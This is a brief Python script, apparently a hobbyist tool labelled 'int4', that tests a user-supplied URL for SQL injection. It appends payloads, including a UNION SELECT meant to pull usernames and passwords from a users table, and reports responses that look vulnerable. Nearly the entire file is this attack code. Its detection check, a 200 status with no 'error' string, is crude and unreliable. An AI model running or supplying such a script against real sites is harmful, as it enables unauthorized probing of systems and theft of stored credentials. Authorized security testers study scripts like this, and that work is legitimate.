import requests

def sql_injection_tester(target_url):
    """[Test for SQL Injection vulnerabilities]"""
    payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "' UNION SELECT NULL, username, password FROM users --"]
    vulnerable_urls = []

    for payload in payloads:
        url = target_url + payload
        response = requests.get(url)
        
        if response.status_code == 200 and "error" not in response.text.lower():
            print(f"Potential SQL Injection Vulnerability: {url}")
            vulnerable_urls.append(url)

    if not vulnerable_urls:
        print("No SQL Injection vulnerabilities found.")
    
    return vulnerable_urls

# User input
target_url = input("\033[91mint4 [Enter the Target URL] > \033[0m")
sql_injection_tester(target_url)